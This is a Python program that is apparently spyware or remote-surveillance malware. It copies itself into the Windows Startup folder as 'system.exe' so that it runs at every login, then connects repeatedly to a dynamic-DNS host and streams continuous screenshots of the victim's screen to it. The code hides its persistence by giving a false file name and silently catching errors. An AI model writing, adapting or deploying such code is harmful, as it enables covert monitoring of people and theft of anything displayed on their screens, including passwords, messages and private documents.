import socket
import threading
import mss
import numpy as np
import cv2
import time
import os
import shutil
import sys

# Function to add the executable to Windows startup folder
def add_to_startup():
    startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    
    # Get the path of the current executable (if running as an exe, otherwise will point to the Python interpreter)
    exe_path = sys.executable  
    
    # Destination path in Startup folder
    dest_path = os.path.join(startup_dir, 'system.exe')
    
    # Copy only if it's not already in the Startup folder
    if not os.path.exists(dest_path):
        try:
            shutil.copyfile(exe_path, dest_path)
            pass
        except Exception as e:
            pass
    else:
        pass

# Client to capture and send screen
class ScreenClient:
    def __init__(self, host='127.0.0.1', port=9999):
        self.host = host
        self.port = port
        self.sock = None
        self.connect_to_server()

    # Connect to the server and attempt reconnect if failed
    def connect_to_server(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.host, self.port))
                print(f"Connected to server at {self.host}:{self.port}")
                self.send_screen()
            except (ConnectionRefusedError, socket.error):
                time.sleep(0.5)  # Wait 5 seconds before retrying

    def send_screen(self):
        with mss.mss() as sct:
            while True:
                try:
                    # Capture screen
                    screen = sct.grab(sct.monitors[1])
                    img = np.array(screen)
                    img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
                    _, buffer = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 50])
                    self.sock.sendall(len(buffer).to_bytes(4, 'big'))
                    self.sock.sendall(buffer)
                except (ConnectionResetError, BrokenPipeError):
                    self.connect_to_server()
                    break

if __name__ == '__main__':
    add_to_startup()  # Add to startup on script execution
    client = ScreenClient(host='myfirstweb.ddns.net')  # Replace 'SERVER_IP_HERE' with the actual server IP
